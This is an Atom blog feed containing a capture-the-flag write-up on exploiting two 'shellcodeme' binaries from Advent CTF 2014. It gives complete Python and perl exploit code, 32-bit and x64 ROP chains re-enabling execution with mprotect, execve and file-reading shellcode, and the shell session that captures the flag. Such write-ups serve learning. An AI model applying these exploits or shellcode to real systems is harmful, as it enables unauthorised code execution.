@@ -1,0 +1,269 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: Pwnable | staring into /dev/null]]></title>
+  <link href="http://barrebas.github.io/blog/categories/pwnable/atom.xml" rel="self"/>
+  <link href="http://barrebas.github.io/"/>
+  <updated>2014-12-24T12:12:27+01:00</updated>
+  <id>http://barrebas.github.io/</id>
+  <author>
+    <name><![CDATA[barrebas]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[Advent CTF 2014 - Shellcodeme]]></title>
+    <link href="http://barrebas.github.io/blog/2014/12/24/advent-ctf-2014-shellcodeme/"/>
+    <updated>2014-12-24T11:37:46+01:00</updated>
+    <id>http://barrebas.github.io/blog/2014/12/24/advent-ctf-2014-shellcodeme</id>
+    <content type="html"><![CDATA[<p>Why o why do we take part in these painful exercises? Again, <code>shellcodeme</code> seemed like such a simple task. But looks, like all the other challenges of Advent CTF 2014, can be deceiving!</p>
+
+<!-- more -->
+
+
+<p></p>
+
+<p>We&rsquo;re given a binary and the C source code:</p>
+
+<pre><code class="c">/* gcc -m32 -fno-stack-protector -znoexecstack -o shellcodeme shellcodeme.c */
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;sys/mman.h&gt;
+
+#define SHELLCODE_LEN 1024
+
+int main(void) {
+    char *buf;
+    buf = mmap((void *)0x20000000, SHELLCODE_LEN, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+    read(0, &amp;buf, SHELLCODE_LEN);
+    mprotect((void *)0x20000000, SHELLCODE_LEN, PROT_READ); // no no no~
+    (*(void(*)()) buf)(); // SEGV! no exec. can you execute shellcode?
+}
+</code></pre>
+
+<p>The bug was kind of obvious:</p>
+
+<pre><code class="c">read(0, &amp;buf, SHELLCODE_LEN); // read to the location of buf itself
+</code></pre>
+
+<p>The code will read in the shellcode at <code>&amp;buf</code>, not <code>buf</code>. This will allow us to overwrite that pointer and take control of execution at this line of code:</p>
+
+<pre><code class="c">(*(void(*)()) buf)(); // SEGV! no exec. can you execute shellcode?
+</code></pre>
+
+<p>I chose to overwrite the <code>buf</code> pointer with <code>0x080484fc</code>, which is <code>leave; ret</code>. This will restore the stack and land us in my ROP chain. The basic idea is to re-use <code>mprotect</code> and <code>read</code> to read in the shellcode and then return to it. The following python code did just that, landing me a shell on the box:</p>
+
+<pre><code class="python">#!/usr/bin/python
+import struct
+import socket
+import telnetlib
+import time
+
+def p(x):
+        return struct.pack('&lt;L', x)
+
+POP3RET = 0x804855d
+MPROTECT = 0x8048330
+READ = 0x8048340
+
+payload = ""
+payload += p(0x080484fc)        # leave; ret (restore stack)
+payload += "A"*12               # dummy 
+
+payload += p(MPROTECT)          # mprotect shellcode area back to rwx
+payload += p(POP3RET)           # fix stack
+payload += p(0x20000000)        # addr of shellcode
+payload += p(0x1000)            # size (page-aligned)
+payload += p(0x7)               # PROT_READ|PROT_EXEC|PROT_WRITE
+
+payload += p(READ)              # read in our shellcode
+payload += p(POP3RET)           # fix stack
+payload += p(0x0)               # stdin
+payload += p(0x20000000)        # address
+payload += p(1024)              # copied value
+
+payload += p(0x20000000)        # return to shellcode
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('pwnable.katsudon.org', 33201))
+
+# send first stage
+s.send(payload)
+
+# for some reason, this delay was necessary
+time.sleep(0.05)
+
+# send shellcode, spawns /bin/sh
+s.send("\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68")
+
+t = telnetlib.Telnet()
+t.sock = s
+t.interact()
+</code></pre>
+
+<p>I thought I was home-free! Let&rsquo;s cat that flag and be done with it! But what&rsquo;s this? (Yes, I&rsquo;ve started using kali! =))</p>
+
+<pre><code class="bash">root@kali:~# python exploit.py
+id
+uid=1000(shellcodeme) gid=1000(shellcodeme) groups=1000(shellcodeme)
+ls -alh
+total 36K
+dr-xr-xr-x 2 root shellcodeme2 4.0K Dec 22 22:09 .
+drwxr-xr-x 3 root root         4.0K Dec 22 22:09 ..
+-rw-r--r-- 1 root shellcodeme2  220 Sep 26 04:49 .bash_logout
+-rw-r--r-- 1 root shellcodeme2 3.4K Sep 26 04:49 .bashrc
+-rw-r--r-- 1 root shellcodeme2  675 Sep 26 04:49 .profile
+-r--r----- 1 root shellcodeme2   34 Dec 22 22:09 flag
+-r-xr-sr-x 1 root shellcodeme2 8.5K Dec 22 22:09 shellcodeme2
+cat flag 2&gt;&amp;1
+cat: flag: Permission denied
+</code></pre>
+
+<p>Gah! We need to exploit another binary! This one is the same C code, but compiled as x64 code&hellip; I transferred the binary over to my box and started poking it.</p>
+
+<p>The basic solution stays the same: mprotect, read, shellcode, flag. The problem with x64 is that we cannot pass the arguments to calls on the stack: that goes via registers. The two functions I needed are here:</p>
+
+<pre><code class="bash">   0x00000000004005f2 &lt;+53&gt;:    mov    edx,0x400
+   0x00000000004005f7 &lt;+58&gt;:    mov    rsi,rax
+   0x00000000004005fa &lt;+61&gt;:    mov    edi,0x0
+   0x00000000004005ff &lt;+66&gt;:    mov    eax,0x0
+   0x0000000000400604 &lt;+71&gt;:    call   0x400490 &lt;read@plt&gt;
+   0x0000000000400609 &lt;+76&gt;:    mov    edx,0x1
+   0x000000000040060e &lt;+81&gt;:    mov    esi,0x400
+   0x0000000000400613 &lt;+86&gt;:    mov    edi,0x20000000
+   0x0000000000400618 &lt;+91&gt;:    call   0x4004c0 &lt;mprotect@plt&gt;
+</code></pre>
+
+<p>I uploaded the binary to <a href="https://ropshell.com">ropshell.com</a> and analyzed it to find the gadgets I&rsquo;d need. I found <code>esi/rsi</code> and <code>edi/rdi</code> quickly, but <code>edx/rdx</code> was nowhere to be found. Finally, I located these two gadgets:</p>
+
+<pre><code>0x0040068a : pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
+0x00400671 : mov edx, ebp; mov rsi, r14; mov edi, r15d; call [r12 + rbx*8]
+</code></pre>
+
+<p>Prepare for some mind-bending ROP chains&hellip;</p>
+
+<pre><code class="python">#!/usr/bin/python
+
+import struct
+def p(x):
+    return struct.pack("L", x)
+
+payload = ""
+
+'''
+   #0x0040068a : pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
+   #0x00400671 : mov edx, ebp; mov rsi, r14; mov edi, r15d; call [r12 + rbx*8]
+'''
+
+# first, fix up stack   
+payload += p(0x00400690)    # pop pop ret
+payload += p(0x0)
+payload += p(0x0)
+
+#### MPROTECT
+# gadgets to set edi, esi and edx and call mprotect
+payload += p(0x0040068a)    # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
+payload += p(0x6)           # rbx   &lt;&lt; needs to be ebp-1 for code path!
+payload += p(0x7)           # rbp -&gt; edx = mprotect.mask
+payload += p(0x00601038-6*8)    # r12 -&gt; mprotect@got.plt
+payload += p(0x0)           # r13
+payload += p(0x400)         # r14 -&gt; rsi -&gt; esi = mprotect.len
+payload += p(0x20000000)    # r15 -&gt; rdi -&gt; edi = mprotect.addr
+
+payload += p(0x00400671)    #mov edx, ebp; mov rsi, r14; mov edi, r15d; call [r12 + rbx*8]
+payload += "B"*(200-144)    # spacer
+
+#### READ
+# gadgets to set edi, esi and edx and call read
+'''
+   0x00000000004005f2 &lt;+53&gt;:    mov    edx,0x400
+   0x00000000004005f7 &lt;+58&gt;:    mov    rsi,rax
+   0x00000000004005fa &lt;+61&gt;:    mov    edi,0x0
+   0x00000000004005ff &lt;+66&gt;:    mov    eax,0x0
+   0x0000000000400604 &lt;+71&gt;:    call   0x400490 &lt;read@plt&gt;
+'''
+# 0x601020 &lt;read@got.plt&gt;
+payload += p(0x0040068a)    # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
+payload += p(0x400-1)       # rbx   &lt;&lt; needs to be ebp-1 for code path!
+payload += p(0x400)         # rbp -&gt; edx = 0x400
+payload += p(0x601020-0x3ff*8)  # r12 -&gt; read@got.plt
+payload += p(0x0)           # r13 
+payload += p(0x20000000)    # r14 -&gt; rsi -&gt; esi = read.addr
+payload += p(0x0)           # r15 -&gt; rdi -&gt; edi = 0?
+                            # lucky for me, rax = 0
+payload += p(0x00400671)    #mov edx, ebp; mov rsi, r14; mov edi, r15d; call [r12 + rbx*8]
+payload += "B"*(200-144)    # spacer
+
+# return to shellcode!
+payload += p(0x20000000)
+
+print payload
+</code></pre>
+
+<p>One of the tricky things with the mprotect and read ROP chains is the following. The code at <code>0x400671</code>, which I use to set <code>edx</code>, looks like this:</p>
+
+<pre><code>   0x400671 &lt;__libc_csu_init+65&gt;:   mov    edx,ebp
+   0x400673 &lt;__libc_csu_init+67&gt;:   mov    rsi,r14
+   0x400676 &lt;__libc_csu_init+70&gt;:   mov    edi,r15d
+   0x400679 &lt;__libc_csu_init+73&gt;:   call   QWORD PTR [r12+rbx*8]
+   0x40067d &lt;__libc_csu_init+77&gt;:   add    rbx,0x1
+   0x400681 &lt;__libc_csu_init+81&gt;:   cmp    rbx,rbp  
+   0x400684 &lt;__libc_csu_init+84&gt;:   jne    0x400670 &lt;__libc_csu_init+64&gt;
+   0x400686 &lt;__libc_csu_init+86&gt;:   add    rsp,0x8
+   0x40068a &lt;__libc_csu_init+90&gt;:   pop    rbx
+   0x40068b &lt;__libc_csu_init+91&gt;:   pop    rbp
+   0x40068c &lt;__libc_csu_init+92&gt;:   pop    r12
+   0x40068e &lt;__libc_csu_init+94&gt;:   pop    r13
+   0x400690 &lt;__libc_csu_init+96&gt;:   pop    r14
+   0x400692 &lt;__libc_csu_init+98&gt;:   pop    r15
+   0x400694 &lt;__libc_csu_init+100&gt;:  ret    
+</code></pre>
+
+<p>First <code>ebp</code> is copied to <code>edx</code>. Then <code>rsi</code> and <code>edi</code> are set. Then we call the QWORD pointer at a memory address referenced by <code>esi</code> and <code>ebx</code>. I chose to <code>esi</code> and <code>ebx</code> such that they point to the got pointer of mprotect.</p>
+
+<p>The problem arises after returning from the mprotect call:</p>
+
+<pre><code class="bash">   0x40067d &lt;__libc_csu_init+77&gt;:   add    rbx,0x1
+   0x400681 &lt;__libc_csu_init+81&gt;:   cmp    rbx,rbp
+   0x400684 &lt;__libc_csu_init+84&gt;:   jne    0x400670 &lt;__libc_csu_init+64&gt;
+</code></pre>
+
+<p>So I needed to make sure that <code>rbx</code> and <code>rbp</code> were equal, otherwise the code jumps away and I inevitably got a crash. I solved that problem by setting <code>rbx</code> to <code>rbp-1</code>. Only thing left was to adjust <code>esi</code> and away we go! With the problem of setting <code>edx</code> out of the way, I could call mprotect to set <code>0x20000000</code> to rwx and read in the shellcode. This needed to be run from the shell that I obtained from exploiting the first binary.</p>
+
+<p>I sprinkled in some <a href="http://www.shell-storm.org/shellcode/files/shellcode-878.php">shellcode magic</a> and was able to exploit the binary locally!</p>
+
+<p>Remotely, I ran into a problem: I could not make files on the remote system, nor was python installed. I rewrote the exploit to dump the shellcode as printable bytes:</p>
+
+<pre><code class="python">shellcode = payload.encode('hex')
+
+output = ""
+
+for i in range(len(shellcode)/2):
+    output += "\\x" +shellcode[i*2:i*2+2]
+
+print output
+</code></pre>
+
+<p>I tried to run the exploit and shellcode using various combinations of echo and printf (also after spawning /bin/bash) but nothing seemed to work. It seemed the exploit didn&rsquo;t work with those two bash builtins, while it did with python. I looked for a replacement and lo and behold: perl was installed on the remote box! I rewrote the exploit to read <code>flag</code> instead of <code>/etc/passwd</code>. For this, I had to adjust the offset:</p>
+
+<pre><code>xor byte [rdi + 11], 0x41
+--&gt;
+xor byte [rdi + 4], 0x41
+</code></pre>
+
+<p>And <strong>finally</strong>, starting from the first binary:</p>
+
+<pre><code class="bash">root@kali:~# python exploit.py
+id
+uid=1000(shellcodeme) gid=1000(shellcodeme) groups=1000(shellcodeme)
+(perl -e 'print "\x90\x06\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x8a\x06\x40\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00\x08\x10\x60\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x00\x00\x71\x06\x40\x00\x00\x00\x00\x00\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x8a\x06\x40\x00\x00\x00\x00\x00\xff\x03\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x28\xf0\x5f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x71\x06\x40\x00\x00\x00\x00\x00\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x00\x00\x00\x20\x00\x00\x00\x00"'; perl -e 'print "\xeb\x3f\x5f\x80\x77\x04\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xffflag\x41"') | ./shellcodeme2
+ADCTF_I_l0v3_tH15_4W350M3_m15T4K
+</code></pre>
+
+<p>This one was tough, but a fun one nonetheless! ROP all the things! =)</p>
+]]></content>
+  </entry>
+  
+</feed>
